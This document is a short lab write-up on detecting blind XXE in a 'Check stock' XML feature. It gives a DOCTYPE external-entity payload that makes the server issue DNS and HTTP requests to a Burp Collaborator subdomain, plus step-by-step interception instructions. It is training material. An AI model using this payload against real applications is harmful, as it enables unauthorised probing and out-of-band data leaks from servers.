# Lab 3: Blind XXE with out-of-band interaction
This lab has a "Check stock" feature that parses XML input but does not display the result.

You can detect the blind XXE vulnerability by triggering out-of-band interactions with an external domain.

To solve the lab, use an external entity to make the XML parser issue a DNS lookup and HTTP request to Burp Collaborator.

## Solution
> Manual Exploitation
1. Visit a product page, click "Check stock" and intercept the resulting POST request in Burp Suite Professional.
2. Insert the following external entity definition in between the XML declaration and the `stockCheck` element. Right-click and select "Insert Collaborator payload" to insert a Burp Collaborator subdomain where indicated:
```
<!DOCTYPE stockCheck [ <!ENTITY xxe SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN"> ]>
```
3. Replace the `productId` number with a reference to the external entity: `&xxe;`
4. Go to the Collaborator tab, and click `Poll now`. If you don't see any interactions listed, wait a few seconds and try again. You should see some DNS and HTTP interactions that were initiated by the application as the result of your payload.

## Video Solution
- [Sommer's Video](https://youtu.be/st3Jj6byBrU)
- [Seven Seas Security's Video](https://youtu.be/T3eo0CtYzYo)
